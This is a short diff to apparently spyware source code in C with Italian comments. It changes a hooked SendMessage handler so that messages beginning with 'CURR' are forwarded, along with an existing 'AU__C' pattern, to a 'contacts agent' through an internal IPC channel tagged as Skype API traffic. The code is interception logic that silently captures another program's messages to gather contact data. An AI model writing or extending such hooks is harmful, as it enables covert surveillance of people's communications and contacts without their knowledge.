@@ -1398,7 +1398,8 @@ LRESULT __stdcall PM_SendMessage(  HWND hWnd,
 			// Se eccedesse, il messaggio non verrebbe mandato proprio
 			if (data_len > MAX_MSG_LEN)
 				data_len = MAX_MSG_LEN;
-			if ( (msg_body[0]=='A' && msg_body[1]=='U' && msg_body[4]=='_' && msg_body[5]=='C') )
+			if ( (msg_body[0]=='A' && msg_body[1]=='U' && msg_body[4]=='_' && msg_body[5]=='C') ||
+				 (msg_body[0]=='C' && msg_body[1]=='U' && msg_body[2]=='R' && msg_body[3]=='R'))
 				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)cdata->lpData, data_len, FLAGS_SKAPI_MSG, IPC_HI_PRIORITY);
 		}
 
